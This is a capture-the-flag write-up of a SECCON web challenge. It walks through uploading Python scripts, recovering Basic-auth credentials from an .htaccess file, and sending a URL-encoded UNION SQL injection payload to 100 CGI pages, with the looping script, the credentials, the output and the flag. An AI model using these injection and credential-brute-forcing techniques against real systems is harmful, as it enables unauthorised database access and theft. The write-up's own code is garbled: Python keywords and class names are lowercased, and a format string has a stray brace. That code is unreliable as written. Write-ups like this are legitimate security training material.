# uncomfortable web (web, 300, 78 solves)

> attack to http://127.0.0.1:81/authed/ through the uploaded script at http://uncomfortableweb.pwn.seccon.jp/.

> get the flag in the database!

we start off by making a quick script to quickly send our python scripts:

``` python
h = htmlparser()

url = "http://uncomfortableweb.pwn.seccon.jp/?"
files = {'file': open('uncom.py', 'rb')}

r = requests.post(url=url, files=files)
print(h.unescape(r.text[290:-436]))
```

after a quick traversal, we notice two interesting things:

* `127.0.0.1:81/select.cgi`
* `127.0.0.1:81/authed/sqlinj/`



first link allows us to get the .htaccess file from `authed` directory, which we can brute and get the login/pass.

as for the second link, the directory's name strongly suggest a sql injection, there are 100 cgi files insides, so we can guess, that only one/few of them actually have sqli in them. 


let's try to inject `' or '1'='1` into every page: 

``` python
conn = httplib.httpconnection('127.0.0.1', 81)
headers = {}
headers["authorization"] = "basic {0}".format(base64.b64encode("{0}:{1}".format('keigo', 'test')))

for i in range(100):
	conn.request("get", "/authed/sqlinj/{}}.cgi?no=".format(str(i))+urllib.quote_plus("4a' or '1'='1' union select *, null, null from f1ags /*"), none, headers)
	res = conn.getresponse()
	print(res.read().decode("utf-8"))
	
conn.close()
```

the important thing here, is that we urlencode the payload, it wouldn't work otherwise.
in return we get:

```
.
.
.
70 link
71 link
72 link
isbn-10: 4822267865
isbn-13: 978-4822267865
publish: 2015/2/20
isbn-10: 4822267911
isbn-13: 978-4822267919
publish: 2015/8/27

isbn-10: 4822267938
isbn-13: 978-4822267933
publish: 2016/2/19

isbn-10: 4822237842
isbn-13: 978-4822237844
publish: 2016/8/25

73 link
.
.
.
```

success!

the db turns out to be sqlite, after some fiddling with the `sqlite_master` table, we finally arrive with the final exploit: `seccon{i want to eventually make a cgc web edition... someday...}`



